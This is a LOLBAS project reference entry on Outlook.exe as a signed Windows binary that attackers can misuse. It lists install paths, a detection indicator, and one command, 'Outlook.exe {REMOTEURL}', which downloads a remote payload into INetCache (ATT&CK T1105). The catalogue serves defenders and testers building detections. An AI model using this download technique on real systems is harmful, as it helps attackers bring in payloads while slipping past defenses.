---
title: "Outlook.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/Outlook/
fetched_at: 2026-09-20T17:15:14Z
license: unspecified
category: windows
---

Microsoft Office component

## Paths
- C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\Outlook.exe
- C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\Outlook.exe
- C:\Program Files (x86)\Microsoft Office\Office16\Outlook.exe
- C:\Program Files\Microsoft Office\Office16\Outlook.exe
- C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\Outlook.exe
- C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\Outlook.exe
- C:\Program Files (x86)\Microsoft Office\Office15\Outlook.exe
- C:\Program Files\Microsoft Office\Office15\Outlook.exe
- C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\Outlook.exe
- C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\Outlook.exe
- C:\Program Files (x86)\Microsoft Office\Office14\Outlook.exe
- C:\Program Files\Microsoft Office\Office14\Outlook.exe
- C:\Program Files (x86)\Microsoft Office\Office12\Outlook.exe
- C:\Program Files\Microsoft Office\Office12\Outlook.exe
- C:\Program Files\Microsoft Office\Office12\Outlook.exe

## Acknowledgements
- Nir Chako (Pentera) ([@C_h4ck_0](https://twitter.com/@C_h4ck_0))

## Detections
- IOC: Suspicious Office application Internet/network traffic

## Download

1. Downloads payload from remote server

```
Outlook.exe {REMOTEURL}
```

   - Use case: It will download a remote payload and place it in INetCache.

   - Privileges required: User

   - Operating systems: Windows

   - ATT&CK® technique: T1105

   - Tags: Download: INetCache
